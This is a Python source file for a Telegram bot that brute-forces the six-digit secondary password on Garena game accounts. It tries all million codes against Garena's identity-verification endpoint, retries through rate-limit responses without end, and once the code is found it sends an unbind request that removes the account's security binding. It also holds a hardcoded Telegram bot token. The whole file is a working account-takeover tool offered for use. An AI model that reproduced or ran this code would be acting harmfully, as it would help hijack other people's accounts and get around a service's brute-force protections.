import requests
import os
import sys
import json
import time
import hashlib
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
import urllib3
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
import asyncio
from datetime import datetime
import uuid

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==================== CONFIGURATION ====================
BOT_TOKEN = "8310387756:AAEpmT2Qqjl5atmwGnvR9nY9xD3QX35ID_E"  # আপনার টেলিগ্রাম টোকেন
MAX_THREADS_PER_TOKEN = 4   # সার্ভার ব্লক এড়াতে নিরাপদ থ্রেড লিমিট
MAX_TOTAL_TOKENS = 10
REQUEST_TIMEOUT = 10
RETRY_COUNT = 5
# =======================================================

# Global variables
lock = Lock()
active_tasks = {}  

# Create session for connection pooling
session = requests.Session()
session.verify = False
session.headers.update({
    "User-Agent": "GarenaMSDK/4.0.30",
    "Accept": "application/json",
    "Connection": "keep-alive"
})

adapter = requests.adapters.HTTPAdapter(
    pool_connections=50,
    pool_maxsize=50,
    max_retries=RETRY_COUNT,
    pool_block=False
)
session.mount('http://', adapter)
session.mount('https://', adapter)

class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    MAGENTA = '\033[95m'
    BLUE = '\033[94m'
    BOLD = '\033[1m'
    END = '\033[0m'

ANIMATION_FRAMES = ['⚡ [■□□□□□□□□□]', '🔥 [■■■□□□□□□□]', '🚀 [■■■■■□□□□□]', '💎 [■■■■■■■□□□]', '🎯 [■■■■■■■■■■]']
EMOJIS = ['🔓', '🔑', '⚡', '💻', '🎯', '🚀', '🔥', '⚙️']

class TokenTask:
    def __init__(self, task_id, token_number, access_token, start_from, chat_id, context):
        self.task_id = task_id
        self.token_number = token_number
        self.access_token = access_token
        self.start_from = start_from
        self.email = None
        self.chat_id = chat_id
        self.context = context
        self.stop_flag = False
        self.current_code = ""
        self.attempted_count = 0
        self.successful_count = 0
        self.failed_count = 0
        self.blocked_count = 0      
        self.recovered_count = 0    
        self.found_code = None
        self.found_identity_token = None
        self.start_time = None
        self.message = None  
        self.completed = False

def print_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"{Colors.GREEN}[+] Telegram Zero-Drop Brute-Force Bot Running Successfully...{Colors.END}")
    print(f"{Colors.CYAN}[+] All logs & animations are now redirected to Telegram.{Colors.END}")

def test_code_with_infinite_retry(task, code, headers):
    if task.stop_flag:
        return None, None
    
    task.current_code = code
    hashed_sec_code = hashlib.sha256(code.encode('utf-8')).hexdigest()
    verify_url = "https://100067.connect.garena.com/game/account_security/bind:verify_identity"
    verify_data = {
        "email": task.email,
        "app_id": "100067",
        "access_token": task.access_token,
        "secondary_password": hashed_sec_code
    }
    
    while not task.stop_flag:
        try:
            response = session.post(
                verify_url,
                headers=headers,
                data=verify_data,
                timeout=6,
                verify=False
            )
            
            if response and response.status_code == 200:
                res_json = response.json()
                if "identity_token" in res_json and res_json.get("identity_token"):
                    with lock:
                        if not task.stop_flag:
                            task.found_code = code
                            task.found_identity_token = res_json.get("identity_token")
                            task.stop_flag = True
                            task.successful_count += 1
                            task.completed = True
                    return code, res_json.get("identity_token")
                else:
                    with lock:
                        task.failed_count += 1
                    break 
                    
            elif response.status_code in [429, 500, 502, 503, 504]:  
                with lock:
                    task.blocked_count += 1
                time.sleep(2.0)  
                continue
            else:
                with lock:
                    task.blocked_count += 1
                time.sleep(1.0)
                continue
                
        except Exception as e:
            with lock:
                task.blocked_count += 1
            time.sleep(1.5)
            continue
    
    with lock:
        task.attempted_count += 1
        task.recovered_count += 1
    
    return None, None

async def get_bind_info(access_token):
    try:
        url_info = "https://100067.connect.garena.com/game/account_security/bind:get_bind_info"
        info_payload = {'app_id': "100067", 'access_token': access_token}
        info_headers = {'User-Agent': "GarenaMSDK/4.0.30"}
        
        response = session.get(url_info, params=info_payload, headers=info_headers, timeout=10, verify=False)
        if response and response.status_code == 200:
            email = response.json().get("email", "")
            return email
        return None
    except:
        return None

async def send_unbind_request(access_token, identity_token):
    try:
        unbind_url = "https://100067.connect.garena.com/game/account_security/bind:create_unbind_request"
        headers = {
            "User-Agent": "GarenaMSDK/4.0.30",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "application/json",
            "Connection": "keep-alive"
        }
        unbind_data = {
            "app_id": "100067",
            "access_token": access_token,
            "identity_token": identity_token
        }
        
        response = session.post(unbind_url, headers=headers, data=unbind_data, timeout=10, verify=False)
        if response:
            return response.text
        return "No response"
    except Exception as e:
        return f"Error: {str(e)}"

def create_telegram_progress(task):
    elapsed = time.time() - task.start_time if task.start_time else 0
    speed = task.attempted_count / elapsed if elapsed > 0 else 0
    
    total_codes = 1000000
    scanned_total = task.attempted_count
    progress = min((scanned_total / total_codes) * 100, 100)
    bar_length = 15
    filled = int(bar_length * progress / 100)
    bar = '▓' * filled + '░' * (bar_length - filled)
    
    anim_box = ANIMATION_FRAMES[scanned_total % len(ANIMATION_FRAMES)]
    emoji = EMOJIS[(scanned_total // 15) % len(EMOJIS)]
    
    text = (
        f"{emoji} **TELEGRAM ZERO-DROP ENGINE** {emoji}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔹 **Token ID**  : `#{task.token_number}`\n"
        f"📧 **Email**     : `{task.email if task.email else 'Loading...'}`\n"
        f"🎯 **Target**    : `{task.current_code if task.current_code else '000000'}`\n"
        f"🚀 **Start From**: `{task.start_from:06d}`\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📊 **Progress**  : {bar} `{progress:.2f}%`\n"
        f"📈 **Scanned**   : `{scanned_total:,}` / `{total_codes:,}`\n"
        f"🛡️ **Blocks Hit**  : `{task.blocked_count:,}`\n"
        f"🔄 **Recovered** : `{task.recovered_count:,}`\n"
        f"⚡ **Speed**     : `{speed:.0f} codes/sec`\n"
        f"⏱️ **Elapsed**   : `{elapsed:.1f}s`\n"
        f"✨ **Status**    : {anim_box}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    )
    return text

async def run_single_token_bruteforce(task, headers):
    task.start_time = time.time()
    
    async def update_progress():
        while not task.stop_flag and not task.completed:
            try:
                text = create_telegram_progress(task)
                if task.message:
                    await task.message.edit_text(text, parse_mode='Markdown')
            except Exception:
                pass
            await asyncio.sleep(2.5)  
    
    progress_task = asyncio.create_task(update_progress())
    
    def run_bruteforce():
        with ThreadPoolExecutor(max_workers=MAX_THREADS_PER_TOKEN) as executor:
            batch_size = MAX_THREADS_PER_TOKEN * 30
            
            # কাস্টম স্টার্ট পয়েন্ট থেকে শুরু করে ১০ লক্ষ পর্যন্ত এবং বাকিটা আবার শুরুতে ফিরে লুপ হবে (Full 1M coverage)
            range_list = list(range(task.start_from, 1000000)) + list(range(0, task.start_from))
            
            current_idx = 0
            total_range_len = len(range_list)
            
            while current_idx < total_range_len and not task.stop_flag:
                batch_end = min(current_idx + batch_size, total_range_len)
                batch = range_list[current_idx:batch_end]
                futures = []
                
                for i in batch:
                    if task.stop_flag:
                        break
                    code = f"{i:06d}"
                    future = executor.submit(test_code_with_infinite_retry, task, code, headers)
                    futures.append(future)
                
                for future in as_completed(futures):
                    if task.stop_flag:
                        break
                    try:
                        code, token = future.result(timeout=10)
                        if code and token:
                            task.stop_flag = True
                            task.completed = True
                            break
                    except:
                        pass
                
                if task.stop_flag:
                    break
                current_idx = batch_end
    
    loop = asyncio.get_event_loop()
    await loop.run_in_executor(None, run_bruteforce)
    
    progress_task.cancel()
    
    if task.found_code and task.found_identity_token:
        elapsed = time.time() - task.start_time
        success_text = (
            f"🎉 **JACKPOT! REAL CODE FOUND!** 🎉\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📧 **Email:** `{task.email}`\n"
            f"🔑 **Code:** `{task.found_code}`\n"
            f"🔢 **Total Scanned:** {task.attempted_count:,}\n"
            f"🛡️ **Blocks Bypassed:** {task.blocked_count:,}\n"
            f"⏱ **Time Taken:** {elapsed:.2f}s\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📤 **Dispatching Unbind Request...**"
        )
        if task.message:
            await task.message.edit_text(success_text, parse_mode='Markdown')
        
        unbind_result = await send_unbind_request(task.access_token, task.found_identity_token)
        final_text = (
            f"✅ **UNBIND SUCCESSFUL!** ✅\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📧 Email: `{task.email}`\n"
            f"🔑 Code: `{task.found_code}`\n\n"
            f"🌐 **Server Response:**\n`{unbind_result[:250]}`\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        if task.message:
            await task.message.edit_text(final_text, parse_mode='Markdown')
    else:
        if task.message and not task.found_code:
            await task.message.edit_text(f"❌ **Token #{task.token_number} Finished**\nScanned with Zero-Drop Engine.", parse_mode='Markdown')
            
    task.completed = True

async def add_new_token(access_token, start_from, chat_id, context, user_id):
    user_tasks = active_tasks.get(user_id, {}).get('tasks', {})
    current_count = len([t for t in user_tasks.values() if not t.completed])
    
    if current_count >= MAX_TOTAL_TOKENS:
        await context.bot.send_message(chat_id=chat_id, text=f"❌ Max limit reached ({MAX_TOTAL_TOKENS}).", parse_mode='Markdown')
        return
    
    email = await get_bind_info(access_token)
    if not email:
        await context.bot.send_message(chat_id=chat_id, text="❌ **Invalid token!** No bound email found.", parse_mode='Markdown')
        return
    
    token_number = len(user_tasks) + 1
    task_id = str(uuid.uuid4())
    task = TokenTask(task_id, token_number, access_token, start_from, chat_id, context)
    task.email = email
    
    msg = await context.bot.send_message(
        chat_id=chat_id,
        text=f"🔍 **Initializing Token #{token_number}**\n📧 Email: `{email}`\n🚀 Start From: `{start_from:06d}`",
        parse_mode='Markdown'
    )
    task.message = msg
    
    if user_id not in active_tasks:
        active_tasks[user_id] = {'tasks': {}}
    active_tasks[user_id]['tasks'][task_id] = task
    
    headers = {
        "User-Agent": "GarenaMSDK/4.0.30",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json",
        "Connection": "keep-alive"
    }
    
    asyncio.create_task(run_single_token_bruteforce(task, headers))

# Telegram Handlers (Step-by-Step Interactive Flow)
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome_text = (
        "🎮 **TELEGRAM EXCLUSIVE UNBIND BOT** 🎮\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "✨ **Features:**\n"
        "• 100% Terminal Free (All live on Telegram)\n"
        "• Custom Start Point Selection\n"
        "• Infinite Anti-Block & Auto-Recovery\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "👇 Click below to add your token!"
    )
    keyboard = [
        [InlineKeyboardButton("🔑 Add Token & Configure", callback_data="token")],
        [InlineKeyboardButton("🛑 Stop All Tasks", callback_data="stop")]
    ]
    await update.message.reply_text(welcome_text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))

async def token_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['step'] = 'waiting_for_token'
    await update.message.reply_text("🔑 **Step 1/2:** Please send your Garena Access Token below:", parse_mode='Markdown')

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    message_text = update.message.text.strip()
    
    step = context.user_data.get('step')
    
    if step == 'waiting_for_token':
        if len(message_text) < 10:
            await update.message.reply_text("❌ Invalid token format! Please send a valid access token.")
            return
        
        context.user_data['temp_token'] = message_text
        context.user_data['step'] = 'waiting_for_start_point'
        
        await update.message.reply_text(
            "🚀 **Step 2/2:** Enter the **Start Point** (e.g., `0`, `150000`, `500000`).\n"
            "*(Or type `0` to start from the very beginning `000000`)*",
            parse_mode='Markdown'
        )
        
    elif step == 'waiting_for_start_point':
        try:
            start_from = int(message_text)
            if not (0 <= start_from <= 999999):
                raise ValueError()
        except ValueError:
            await update.message.reply_text("❌ Please enter a valid number between `0` and `999999`.")
            return
        
        access_token = context.user_data.get('temp_token')
        context.user_data['step'] = None
        
        await update.message.reply_text(f"✅ Configuration received! Starting brute force from `{start_from:06d}`...", parse_mode='Markdown')
        
        try:
            await add_new_token(access_token, start_from, chat_id, context, user_id)
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_tasks = active_tasks.get(user_id, {}).get('tasks', {})
    for task in user_tasks.values():
        task.stop_flag = True
    await update.message.reply_text("🛑 **All active tasks have been stopped.**", parse_mode='Markdown')

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data == "token":
        context.user_data['step'] = 'waiting_for_token'
        await query.edit_message_text("🔑 **Step 1/2:** Please send your Garena Access Token:")
    elif query.data == "stop":
        user_id = update.effective_user.id
        for task in active_tasks.get(user_id, {}).get('tasks', {}).values():
            task.stop_flag = True
        await query.edit_message_text("🛑 All running tasks stopped.")

def main():
    print_banner()
    application = Application.builder().token(BOT_TOKEN).build()
    
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("token", token_command))
    application.add_handler(CommandHandler("stop", stop_command))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.add_handler(CallbackQueryHandler(button_callback))
    
    application.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}Bot stopped by user.{Colors.END}")
